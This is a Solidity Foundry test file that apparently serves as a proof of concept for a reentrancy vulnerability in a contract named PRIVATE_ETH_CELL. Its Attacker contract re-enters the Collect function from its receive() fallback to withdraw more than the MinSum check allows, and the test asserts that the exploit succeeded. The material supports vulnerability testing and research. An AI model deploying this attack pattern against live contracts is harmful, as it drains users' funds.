
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {
    PRIVATE_ETH_CELL public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether && attackVal < type(uint128).max);

        _logFile = new LogFile();
        _contractUnderTest = new PRIVATE_ETH_CELL();
        
        // Set MinSum slightly higher than attackVal.
        // This ensures that sequentially, a second withdrawal would fail because 
        // the remaining balance would be less than MinSum.
        // Reentrancy allows bypassing this check because the balance isn't updated yet.
        uint256 minSum = attackVal + 100 wei;
        
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(minSum);
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));

        vm.deal(address(this), attackVal * 3);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PRIVATE_ETH_CELL public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PRIVATE_ETH_CELL(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        storedAttackVal = val;
        _victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        attackCallCount = 0;
        initialSnapshot = address(this).balance;

        _victim.Collect(val);

        if (address(this).balance >= initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
